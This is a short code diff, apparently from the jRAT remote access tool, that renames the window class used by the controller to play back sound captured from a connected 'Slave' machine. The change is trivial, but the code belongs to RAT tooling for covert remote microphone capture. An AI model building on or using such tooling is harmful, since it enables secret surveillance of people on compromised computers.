@@ -1,7 +1,7 @@
 package io.jrat.client.packets.incoming;
 
 import io.jrat.client.Slave;
-import io.jrat.client.ui.frames.FrameRemoteSoundCapture;
+import io.jrat.client.ui.frames.DialogRemoteSoundCapture;
 
 import java.io.DataInputStream;
 
@@ -21,7 +21,7 @@ public class Packet58SoundCapture extends AbstractIncomingPacket {
 
 	@Override
 	public void read(Slave slave, DataInputStream dis) throws Exception {
-		FrameRemoteSoundCapture frame = FrameRemoteSoundCapture.instances.get(slave);
+		DialogRemoteSoundCapture frame = DialogRemoteSoundCapture.instances.get(slave);
 		if (!initialized) {
 			info = new DataLine.Info(SourceDataLine.class, format);
 			if (!AudioSystem.isLineSupported(info)) {
